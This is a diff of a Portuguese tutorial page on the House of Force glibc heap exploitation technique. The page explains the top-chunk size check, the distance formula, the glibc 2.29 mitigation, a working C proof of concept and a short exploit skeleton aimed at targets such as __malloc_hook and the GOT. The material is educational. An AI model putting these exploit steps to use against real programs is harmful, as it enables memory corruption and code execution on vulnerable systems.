@@ -3,171 +3,130 @@ title: The House of Force
 sidebar_position: 1
 ---
 
-House of Force é uma técnica de exploração de heap que permite **alocar um chunk em um endereço arbitrário ao corromper o top chunk**. O ataque **manipula o campo size do top chunk** para enganar o malloc e fazer ele acreditar que há espaço suficiente para qualquer alocação.
+House of Force faz o `malloc` devolver um **endereço arbitrário** corrompendo o campo `size` do top chunk. Funciona em **glibc < 2.29**.
 
-O top-chunk (chunk mais ao topo na memória alocada na heap) é similar a qualquer outro chunk alocado por `malloc`: possui um header seguido de uma seção de dados. A diferença mais importante é que ele beira o fim da memória disponível e é o único chunk que pode ser extendido ou reduzido. A implementação do `malloc` trata o top chunk como um caso especial.
-
-## Pré requisitos do ataque
-
-1. **Heap overflow** ou primitiva de **escrita arbitrária** para corromper o `size` do top chunk
-2. **Controle sobre o tamanho de futuras alocações** `malloc()` (e o programa precisa aceitar tamanhos enormes, sem limitar o input)
-3. **Leak de heap** (para saber onde está o top chunk) e, dependendo do alvo, **leak de libc** (se o alvo for na libc, como `__malloc_hook`) ou um binário sem PIE (se o alvo for na `.bss`/GOT)
-4. **glibc < 2.29** (depois disso, o `size` do top chunk é verificado)
-
-## Estrutura do top chunk
-
-O top chunk (também chamado de wilderness) é o último chunk no heap. Quando `malloc()` precisa de memória e **não há chunks adequados nas bins**, ele usa o top chunk.
-
-```
-Heap:
-┌─────────────┐
-│  chunk 1    │
-├─────────────┤
-│  chunk 2    │
-├─────────────┤
-│  chunk 3    │
-├─────────────┤
-│             │
-│ TOP CHUNK   │ ← remainder (tudo que sobra)
-│             │
-│ size: 0x123 │ ← metadado que indica quanto espaço resta
-└─────────────┘
-```
-
-O modo como `malloc()` lida com o top chunk (código simplificado):
+O top chunk é o espaço livre no fim da heap. Quando nenhum bin atende um pedido, o `malloc` corta o começo do top chunk e avança o ponteiro `top`:
 
 ```c
-void *malloc(size_t size) {
-    int top_chunk_size = top_chunk->size
-
-    if (size <= top_chunk_size) {
-        void *ptr = top_chunk;       // posição atual do top chunk
-        top_chunk += size;           // avança o top chunk
-        top_chunk->size = top_chunk_size - size;     // diminui o tamanho restante
-        return ptr;
-    }
-    // senão, expande heap com sbrk/mmap
+// _int_malloc, simplificado
+victim = av->top;
+size = chunksize (victim);
+if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) {
+    remainder = chunk_at_offset (victim, nb);    // novo top = top antigo + nb
+    av->top = remainder;
+    set_head (remainder, (size - nb) | PREV_INUSE);
+    return chunk2mem (victim);
 }
 ```
+
+A única barreira é a comparação `size >= nb + MINSIZE`, sem sinal. Se o `size` do top chunk for `0xffffffffffffffff`, **qualquer pedido passa**, e o novo `top` é simplesmente `top + nb`. Escolhendo `nb`, colocamos o `top` onde quisermos, e a alocação seguinte sai de lá.
+
+## Pré-requisitos
+
+1. **Sobrescrever o `size` do top chunk**: um heap overflow no último chunk alocado basta (o top vem logo depois).
+2. **Controlar o tamanho de um `malloc`**, sem limite superior: o pedido é enorme (ou "negativo").
+3. **Saber a distância entre o top chunk e o alvo**: leak da heap, mais o endereço do alvo (leak de libc, ou binário sem PIE para alvos na `.bss`/GOT).
+4. **glibc < 2.29**.
 
 ## O ataque
 
-1. Corromper o `top_chunk->size` com um valor enorme (geralmente `-1` ou `0xffffffffffffffff`). Isso faz o `malloc()` acreditar que o top chunk tem espaço "infinito". 
-2. Calcular a distância até o alvo. Queremos que, depois da nossa alocação, o **header** do novo top chunk fique em `target - 0x10`, para que a alocação seguinte devolva exatamente `target` (o `malloc` retorna `header + 0x10`). Como o `malloc(n)` cria um chunk de tamanho `n + 0x10` (arredondado), o pedido é `distance = target_address - top_chunk_address - 0x20` (`0x10` do header do chunk que vamos receber agora e `0x10` do header do chunk que será devolvido depois). Aqui, `top_chunk_address` é o endereço do **header** do top chunk (onde está o `size` que corrompemos, menos 8).
-3. Alocar um chunk com tamanho igual à distância calculada. `void *p = malloc(distance)`. Esta alocação move o top chunk até `target_address - 0x10`.
-4. Fazer uma segunda alocação. Essa alocação retorna exatamente o `target_address`, de modo que qualquer dado inserido no campo de dados desse chunk alocado estará sobrescrevendo `target_address`. Escrita arbitrária!
+<Side>
+  <Mem
+    title="1. Overflow no size do top"
+    cellW={230}
+    rows={[
+      {label: 'chunk A (overflow)', kind: 'ctrl', h: 1.4},
+      {addr: 'top', cells: [{label: 'prev_size', kind: 'meta'}, {label: '0xffff...ffff', kind: 'danger'}]},
+      {label: 'top chunk', kind: 'free', h: 1.4},
+      {gap: true},
+      {addr: 'alvo', label: 'alvo', kind: 'neutral'},
+    ]}
+  />
+  <Mem
+    title="2. malloc(alvo - top - 0x20)"
+    cellW={230}
+    rows={[
+      {label: 'chunk A', kind: 'neutral', h: 1.4},
+      {label: 'chunk gigante', kind: 'data', h: 2.4},
+      {gap: true},
+      {addr: 'alvo-0x10', cells: [{label: 'prev_size', kind: 'meta'}, {label: 'size', kind: 'meta'}], note: 'novo top'},
+      {addr: 'alvo', label: 'próximo malloc devolve aqui', kind: 'danger'},
+    ]}
+  />
+</Side>
 
-Esse ataque é bem maluco, pois fazemos uma alocação gigantesca para fazer o `malloc()` levar o top chunk até onde queremos, de modo que a próxima alocação retorne o endereço desejado.
+1. **Corromper**: sobrescreva o `size` do top chunk com `0xffffffffffffffff`.
+2. **Mover o top**: peça `malloc(alvo - top - 0x20)`, onde `top` é o endereço do **header** do top chunk.
+3. **Alocar no alvo**: o `malloc` seguinte devolve exatamente `alvo`. O que o programa escrever nesse chunk é escrito no alvo.
 
-Lembre-se de que o top chunk não é em si um chunk alocado. Ele sempre estará **após o último chunk alocado**.
+**De onde vem o `0x20`?** Queremos o novo header do top em `alvo - 0x10`, para que o chunk seguinte tenha os dados em `alvo`. O `malloc(n)` consome `n + 0x10` bytes do top (o pedido mais o header, a menos de arredondamento). Então `top + n + 0x10 = alvo - 0x10`, e `n = alvo - top - 0x20`.
 
-## Detalhes importantes
+Para o arredondamento não atrapalhar, `alvo` deve ser múltiplo de 16 (se não for, mire `alvo & ~0xf` e compense com padding na escrita).
 
-1. **Alinhamento**: `malloc()` sempre retorna endereços alinhados (múltiplos de 16 bytes em x64). Você precisa calcular o `distance` considerando isso.
+### Alvo antes da heap
+
+O alvo pode estar em endereços **menores** que o top chunk (GOT e `.bss` do binário ficam antes da heap). A conta `alvo - top - 0x20` dá negativa, e, como tudo é aritmética sem sinal de 64 bits, vira um número enorme que faz `top + nb` dar a volta no espaço de endereços e cair no lugar certo.
 
 ```py
-# Se target não está alinhado, ajustar
-target_aligned = target & ~0xf  # zera últimos 4 bits
-distance = target_aligned - top_chunk - 0x20
+n = (alvo - top - 0x20) & 0xffffffffffffffff
 ```
 
-2. **Size com Flags**: O campo size tem flags nos últimos 3 bits. Ao corromper, use:
+O programa precisa aceitar esse tamanho. Um `atoi` que guarda o valor em `int` de 32 bits, ou uma checagem `size < 0x1000`, inviabiliza o ataque. Um `size` lido como `long`/`size_t` e sem limite é o cenário certo.
+
+## Exemplo
+
+```c
+// Requer glibc < 2.29 (ex: Ubuntu 18.04, glibc 2.27)
+#include <stdio.h>
+#include <stdlib.h>
+
+long target_var = 0;                        // alvo: variável global, antes da heap
+
+int main() {
+    long *a = malloc(0x18);                 // chunk de 0x20; o top chunk vem logo depois
+
+    // "Overflow": os dados de a vão de a até a+0x18, e a+0x18 é o size do top chunk
+    a[3] = -1;                              // top->size = 0xffffffffffffffff
+
+    unsigned long top  = (unsigned long)a + 0x10;      // header do top chunk
+    unsigned long alvo = (unsigned long)&target_var;
+
+    malloc(alvo - top - 0x20);              // move o top para alvo - 0x10
+    long *evil = malloc(0x10);              // devolve alvo
+
+    printf("alvo: %p, evil: %p\n", (void *)alvo, (void *)evil);
+    *evil = 0x4141414141414141;
+    printf("target_var = %#lx\n", target_var);
+}
+```
+
+Em um exploit real, o roteiro é o mesmo:
 
 ```py
-evil_size = 0xffffffffffffffff  # todos os bits setados
-# ou
-evil_size = 0xfffffffffffffffe  # preserva alinhamento
+edit(0, b'A' * 0x18 + p64(0xffffffffffffffff))            # overflow até o size do top
+alloc((alvo - top - 0x20) & 0xffffffffffffffff, b'')      # move o top
+alloc(0x18, p64(valor))                                   # escreve no alvo
 ```
 
-3. **Distâncias negativas**: Devido ao wraparound (quando uma operação aritmética ultrapassa o valor máxima, ela volta ao início de forma circular. Se o limite é `0x0000000000000000 - 1 = 0xffffffffffffffff`), distâncias "negativas" funcionam:
-
-```py
-# Se target está ANTES do top chunk no espaço de endereços (ex: a .bss do binário, que fica antes da heap)
-distance = (target - top_chunk - 0x20) & 0xffffffffffffffff
-# Em C, unsigned arithmetic faz wraparound automaticamente (não precisa do & 0xffffffffffffffff, que mantém apenas os 64 bits inferiores)
-```
-
-Isso funciona porque o `malloc` só verifica `size <= top_size` sem sinal: com `top_size = 0xffff...`, qualquer valor passa, e `top += size` dá a volta no espaço de endereços.
+Alvos usuais (glibc < 2.29, então os hooks existem): `__malloc_hook` ou `__free_hook` com `system` ou um *one_gadget*, uma entrada da GOT (sem Full RELRO), ou um ponteiro de função do programa.
 
 ## Mitigações
 
-- **glibc < 2.29**: Sem proteções
-- **glibc ≥ 2.29**: Top Chunk Integrity Check
-- **glibc ≥ 2.32**: Safe-linking, dificulta obter leaks necessários.
-
 ### Top Chunk Integrity Check
 
-A verificação é adicionada:
+A glibc 2.29 passou a validar o `size` do top chunk antes de usá-lo:
 
 ```c
-if ((unsigned long)(size) > (unsigned long)(system_mem) ||
-    (unsigned long)(size) < MINSIZE) {
-    malloc_printerr("malloc(): corrupted top size");
-}
+if (__glibc_unlikely (size > av->system_mem))
+  malloc_printerr ("malloc(): corrupted top size");
 ```
 
-O que verifica:
+`system_mem` é o total de memória que a arena obteve do kernel (`0x21000` em uma heap recém-criada). Um `size` de `-1` é rejeitado na hora. Ainda dá para mentir um valor até `system_mem`, mas aí o salto máximo é do tamanho da própria heap, o que não alcança libc, stack nem (para trás) o binário.
 
-1. `size` não pode ser maior que memória total do sistema
-2. `size` não pode ser menor que tamanho mínimo de chunk
-
-Bypass:
-
-- Impossível com `-1` (muito grande)
-- Em teoria, possível com um `size` menor que `system_mem` (a quantidade de memória que a heap já obteve do kernel, normalmente `0x21000` no início). Mas aí a "distância" que podemos pular fica limitada a esse valor, o que só serve para alvos dentro da própria heap. Na prática, a partir da glibc 2.29 o House of Force é considerado morto, e usa-se Tcache Poisoning no lugar.
-
-## Exemplo em código C
-
-```c
-// Compile com uma glibc < 2.29 para funcionar (ex: Ubuntu 18.04, glibc 2.27)
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-long target_var = 0;   // alvo: uma variável global (na .bss/.data do binário)
-
-int main() {
-    long *target = &target_var;
-
-    // Passo 1: Alocar chunks
-    long *chunk_A = malloc(0x10);
-    long *chunk_B = malloc(0x20);   // chunk de 0x30 bytes: header em B-0x10, próximo header (top) em B+0x20
-
-    // Passo 2: "Overflow" para corromper o size do top chunk
-    // (aqui escrevemos direto. Em um programa vulnerável, seria um overflow a partir de chunk_B)
-    long *top_chunk = chunk_B + 0x20/8;      // header do top chunk = B + 0x20 (prev_size)
-    long *top_chunk_size = top_chunk + 1;    // size do top chunk = B + 0x28
-    *top_chunk_size = -1;                    // 0xffffffffffffffff
-
-    // Passo 3: Calcular distância (pode ser "negativa": o alvo está antes da heap)
-    unsigned long distance = (unsigned long)target - (unsigned long)top_chunk - 0x20;
-
-    // Passo 4: Mover top chunk até target - 0x10
-    malloc(distance);
-
-    // Passo 5: Alocar no target
-    long *evil = malloc(0x10);
-
-    printf("target address: %p\n", target);
-    printf("evil address:   %p\n", evil);
-    printf("Match: %s\n", (evil == target) ? "YES!" : "NO");
-
-    *evil = 0x4141414141414141;              // escreveu em target_var!
-    printf("target_var = %lx\n", target_var);
-
-    return 0;
-}
-```
-
-(A `.bss` fica antes da heap, então a `distance` dá a volta no espaço de endereços. Como o `top` é recalculado com aritmética sem sinal, isso funciona normalmente.)
+Na prática, o House of Force acabou na glibc 2.29. Para "alocar em endereço arbitrário" em versões mais novas, o caminho é [Tcache Poisoning](../tcache.mdx#tcache-poisoning). Corromper o `size` do top chunk para um valor **menor** continua útil em outra técnica: House of Orange (e House of Tangerine), em que o top antigo é liberado quando a heap é estendida.
 
 ## Resumo
 
-House of Force = Corromper top chunk size → Fazer malloc "pular" para endereço arbitrário → Escrever no endereço arbitrário
-
-1. `top_chunk->size = -1`
-2. `malloc(target - top_chunk - 0x20)`
-3. `malloc(small_size) → retorna target`
-4. Usar o endereço à La Carte!
-
-Alvos clássicos (glibc < 2.29, então os hooks ainda existem): `__malloc_hook` ou `__free_hook` (escrever `system` ou um *one_gadget*), a GOT (sem Full RELRO), ou um ponteiro de função do próprio programa.
+1. `top->size = 0xffffffffffffffff`
+2. `malloc(alvo - top - 0x20)`
+3. `malloc(n)` devolve `alvo`
